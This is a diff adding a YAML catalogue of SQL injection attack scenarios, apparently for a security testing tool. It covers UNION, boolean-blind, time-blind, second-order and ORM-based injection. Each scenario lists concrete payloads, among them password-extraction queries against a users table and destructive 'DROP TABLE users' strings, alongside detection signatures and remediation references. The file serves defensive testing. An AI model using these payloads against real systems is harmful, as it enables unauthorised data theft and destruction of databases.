@@ -1,0 +1,203 @@
+# SQL Injection Attack Scenarios
+# Each scenario defines an attack path, prerequisites, and verification
+
+scenarios:
+  - id: sqli-basic-union
+    name: "Basic UNION-based SQL Injection"
+    category: injection
+    subcategory: sql
+    severity: critical
+    cwe: "CWE-89"
+    owasp: "A03:2021"
+    description: "Extract data via UNION injection in vulnerable query parameter"
+    prerequisites:
+      - "Parameterized route with user input"
+      - "Database backend (PostgreSQL, MySQL, SQLite)"
+      - "Error messages or data reflection visible"
+    attack_steps:
+      - step: 1
+        action: "identify_injection_point"
+        description: "Find parameters that accept SQL meta-characters (', \", ;, --)"
+        tool: "fuzz_params"
+        payloads:
+          - "'"
+          - "\""
+          - "' OR '1'='1"
+          - "\" OR \"1\"=\"1"
+          - "';--"
+      - step: 2
+        action: "determine_column_count"
+        description: "Use ORDER BY or UNION NULL to find column count"
+        tool: "sql_payload"
+        payloads:
+          - "' ORDER BY 1--"
+          - "' ORDER BY 2--"
+          - "' ORDER BY 3--"
+          - "' UNION SELECT NULL--"
+          - "' UNION SELECT NULL,NULL--"
+      - step: 3
+        action: "extract_data"
+        description: "Extract data via UNION with known column count"
+        tool: "sql_payload"
+        payloads:
+          - "' UNION SELECT username,password FROM users--"
+          - "' UNION SELECT table_name,column_name FROM information_schema.columns--"
+          - "' UNION SELECT schema_name FROM information_schema.schemata--"
+    detection_signatures:
+      - "SQL syntax error in response"
+      - "Unexpected data in response (usernames, table names)"
+      - "Response time anomalies (time-based blind)"
+    verification:
+      - "Re-run with payload, confirm data extraction"
+      - "Check database logs for anomalous queries"
+    remediation_playbook: "fix-sqli-parameterized-queries"
+    tags: ["union", "error-based", "data-extraction"]
+
+  - id: sqli-blind-boolean
+    name: "Boolean-based Blind SQL Injection"
+    category: injection
+    subcategory: sql
+    severity: high
+    cwe: "CWE-89"
+    owasp: "A03:2021"
+    description: "Extract data bit-by-bit using boolean conditions"
+    prerequisites:
+      - "Parameter vulnerable to injection"
+      - "Application shows different responses for true/false"
+      - "No direct data reflection or errors"
+    attack_steps:
+      - step: 1
+        action: "confirm_boolean_injection"
+        description: "Verify boolean-based injection works"
+        tool: "sql_payload"
+        payloads:
+          - "' AND 1=1--"
+          - "' AND 1=2--"
+      - step: 2
+        action: "extract_schema"
+        description: "Extract database schema character by character"
+        tool: "sql_payload"
+        payload_template: "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='a'--"
+      - step: 3
+        action: "extract_data"
+        description: "Extract sensitive data using binary search"
+        tool: "sql_payload"
+        payload_template: "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) > 100--"
+    detection_signatures:
+      - "Consistent response difference between true/false payloads"
+      - "No SQL errors in response"
+    verification:
+      - "Automated boolean extraction confirms vulnerability"
+      - "Compare response lengths/times for true vs false"
+    remediation_playbook: "fix-sqli-parameterized-queries"
+    tags: ["blind", "boolean", "time-consuming"]
+
+  - id: sqli-blind-time
+    name: "Time-based Blind SQL Injection"
+    category: injection
+    subcategory: sql
+    severity: high
+    cwe: "CWE-89"
+    owasp: "A03:2021"
+    description: "Extract data using time delays (SLEEP, WAITFOR, pg_sleep)"
+    prerequisites:
+      - "Parameter vulnerable to injection"
+      - "No visible response differences"
+      - "Database supports time functions"
+    attack_steps:
+      - step: 1
+        action: "confirm_time_injection"
+        description: "Verify time-based injection with sleep"
+        tool: "sql_payload"
+        payloads:
+          - "'; SELECT pg_sleep(5)--"  # PostgreSQL
+          - "'; WAITFOR DELAY '0:0:5'--"  # SQL Server
+          - "'; SELECT SLEEP(5)--"  # MySQL
+      - step: 2
+        action: "extract_data_timing"
+        description: "Extract data by measuring response times"
+        tool: "sql_payload"
+        payload_template: "'; IF (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) > 100 THEN pg_sleep(5) END IF;--"
+    detection_signatures:
+      - "Response delay matching sleep duration"
+      - "Consistent timing differences"
+    verification:
+      - "Multiple requests show consistent delays"
+      - "Statistical analysis of response times"
+    remediation_playbook: "fix-sqli-parameterized-queries"
+    tags: ["blind", "time-based", "slow"]
+
+  - id: sqli-second-order
+    name: "Second-Order SQL Injection"
+    category: injection
+    subcategory: sql
+    severity: high
+    cwe: "CWE-89"
+    owasp: "A03:2021"
+    description: "Inject payload that executes in a different context/function"
+    prerequisites:
+      - "User input stored in database"
+      - "Stored input later used in SQL query unsafely"
+    attack_steps:
+      - step: 1
+        action: "inject_payload"
+        description: "Store malicious payload in user-controllable field"
+        tool: "http_request"
+        payloads:
+          - "username: admin'--"
+          - "email: test' OR '1'='1'@test.com"
+          - "profile: data'; DROP TABLE users;--"
+      - step: 2
+        action: "trigger_execution"
+        description: "Perform action that uses stored data in query"
+        tool: "http_request"
+        endpoints:
+          - "/profile/update"
+          - "/admin/users"
+          - "/password/reset"
+    detection_signatures:
+      - "Delayed exploitation (not immediate)"
+      - "Payload stored then executed in different context"
+    verification:
+      - "Check database for stored payload"
+      - "Trigger vulnerable function, observe effect"
+    remediation_playbook: "fix-sqli-parameterized-queries"
+    tags: ["second-order", "stored", "delayed"]
+
+  - id: sqli-orm
+    name: "ORM-based SQL Injection"
+    category: injection
+    subcategory: sql
+    severity: high
+    cwe: "CWE-89"
+    owasp: "A03:2021"
+    description: "SQL injection through ORM methods (raw, extra, whereRaw)"
+    prerequisites:
+      - "Application uses ORM (Django, SQLAlchemy, Eloquent, Hibernate, Entity Framework)"
+      - "Raw SQL or unsafe ORM methods used"
+    attack_steps:
+      - step: 1
+        action: "identify_orm_usage"
+        description: "Find raw SQL or unsafe ORM calls in codebase"
+        tool: "code_scan"
+        patterns:
+          - "\.raw\s*\("
+          - "\.extra\s*\("
+          - "\.whereRaw\s*\("
+          - "RawSQL|text\(|execute\s*\("
+          - "\.FromSqlRaw|FromSqlInterpolated"
+      - step: 2
+        action: "exploit_orm_injection"
+        description: "Inject through ORM raw methods"
+        tool: "sql_payload"
+        payloads:
+          - "1; DROP TABLE users--"
+          - "1 UNION SELECT * FROM secrets--"
+    detection_signatures:
+      - "ORM raw method with user input"
+      - "SQL execution from ORM layer"
+    verification:
+      - "Static analysis confirms unsafe ORM usage"
+      - "Dynamic test confirms exploitability"
+    remediation_playbook: "fix-sqli-orm-safe-methods"
+    tags: ["orm", "raw-sql", "framework-specific"]
